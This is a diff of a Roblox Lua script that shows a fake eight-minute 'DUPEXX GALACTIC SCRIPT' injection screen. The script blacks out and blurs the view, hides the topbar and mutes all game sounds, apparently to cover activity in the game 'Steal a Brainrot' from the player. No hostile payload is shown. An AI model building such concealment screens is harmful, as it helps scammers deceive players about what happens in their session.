@@ -2,8 +2,8 @@
 local loadingText1 = "LOADING DUPEXX GALATIC SCRIPT"
 local loadingText2 = "INJECTING DUPEXX GALACTIC SCRIPT"
 
-local loadTime1 = 300
-local loadTime2 = 180
+local loadTime1 = 300  -- 5 minutos
+local loadTime2 = 180  -- 3 minutos
 
 local musicLoading = "rbxassetid://1843529635"
 local musicInjecting = "rbxassetid://9129997143"
@@ -18,15 +18,32 @@ local Lighting = game:GetService("Lighting")
 local StarterGui = game:GetService("StarterGui")
 local SoundService = game:GetService("SoundService")
 
-task.wait(2)  -- ← Muy importante en Steal a Brainrot
+task.wait(2)  -- Delay importante para este juego
 
 -- Ocultar solo la Topbar (más seguro)
 pcall(function()
-    StarterGui:SetCore("TopbarEnabled", false)
+	StarterGui:SetCore("TopbarEnabled", false)
 end)
 
--- Silenciar ruido externo de forma suave (menos detectable)
-SoundService.Volume = 0.15   -- baja mucho el ruido sin poner 0
+-- === SILENCIAR TODO EL JUEGO (forma más segura) ===
+local muteGroup = Instance.new("SoundGroup")
+muteGroup.Name = "MuteGroup"
+muteGroup.Volume = 0
+muteGroup.Parent = SoundService
+
+-- Asignar todos los sonidos existentes al grupo mudo
+for _, sound in ipairs(game:GetDescendants()) do
+	if sound:IsA("Sound") and sound.SoundGroup == nil then
+		sound.SoundGroup = muteGroup
+	end
+end
+
+-- Conectar para que los nuevos sonidos también se muteen
+game.DescendantAdded:Connect(function(desc)
+	if desc:IsA("Sound") and desc.SoundGroup == nil then
+		desc.SoundGroup = muteGroup
+	end
+end)
 
 --// GUI BASE --------------------------------
 local screenGui = Instance.new("ScreenGui")
@@ -40,7 +57,6 @@ background.Size = UDim2.new(1,0,1,0)
 background.BackgroundColor3 = Color3.fromRGB(0,0,0)
 background.Parent = screenGui
 
--- Blur más suave
 local blur = Instance.new("BlurEffect")
 blur.Size = 25
 blur.Parent = Lighting
@@ -50,7 +66,7 @@ stroke.Color = Color3.fromRGB(0,150,255)
 stroke.Thickness = 5
 stroke.Parent = background
 
---// NEBULOSAS (reducidas) -------------------------------
+--// NEBULOSAS (optimizadas) -------------------------------
 local function crearNebulosa(c1,c2,t,vel)
 	local n = Instance.new("Frame")
 	n.Size = UDim2.new(1.5,0,1.5,0)
@@ -68,7 +84,7 @@ local function crearNebulosa(c1,c2,t,vel)
 
 	task.spawn(function()
 		while n and n.Parent do
-			local pos = UDim2.new(math.random(-30,-10)/100,0,math.random(-30,-10)/100,0)
+			local pos = UDim2.new(math.random(-30,-10)/100, 0, math.random(-30,-10)/100, 0)
 			TweenService:Create(n, tweenInfo, {Position = pos}):Play()
 			task.wait(vel * 0.8)
 		end
@@ -78,7 +94,7 @@ end
 crearNebulosa(Color3.fromRGB(50,0,100), Color3.fromRGB(0,100,150), 0.4, 60)
 crearNebulosa(Color3.fromRGB(0,50,120), Color3.fromRGB(80,0,150), 0.5, 80)
 
---// ESTRELLAS (solo 40) -------------------------------
+--// ESTRELLAS (reducidas a 40) -------------------------------
 for i = 1, 40 do
 	local star = Instance.new("Frame")
 	star.Size = UDim2.new(0, math.random(2,4), 0, math.random(2,4))
@@ -97,7 +113,7 @@ for i = 1, 40 do
 	end)
 end
 
---// TEXTO, BARRA, MÚSICA y LOADING (igual que el tuyo) -------------------------------
+--// TEXTO, BARRA, PORCENTAJE -------------------------------
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1,0,0.2,0)
 title.Position = UDim2.new(0,0,0.35,0)
@@ -141,13 +157,16 @@ percent.TextScaled = true
 percent.Text = "0%"
 percent.Parent = background
 
+--// MÚSICA GALÁCTICA (solo esta se escucha) -------------------------------
 local sound = Instance.new("Sound")
 sound.SoundId = musicLoading
 sound.Looped = true
-sound.Volume = 0.6
+sound.Volume = 1
+sound.SoundGroup = nil  -- importante: no va al grupo mudo
 sound.Parent = background
 sound:Play()
 
+--// LOADING FUNC ----------------------------
 local function runLoading(duration, color)
 	local start = tick()
 	bar.BackgroundColor3 = color
@@ -175,5 +194,6 @@ sound:Play()
 
 runLoading(loadTime2, Color3.fromRGB(0,255,100))
 
--- Al final (opcional)
-title.Text = "SCRIPT LOADED SUCCESSFULLY"
+-- Mensaje final
+title.Text = "DUPEXX GALACTIC SCRIPT INJECTED SUCCESSFULLY"
+percent.Text = "100%"
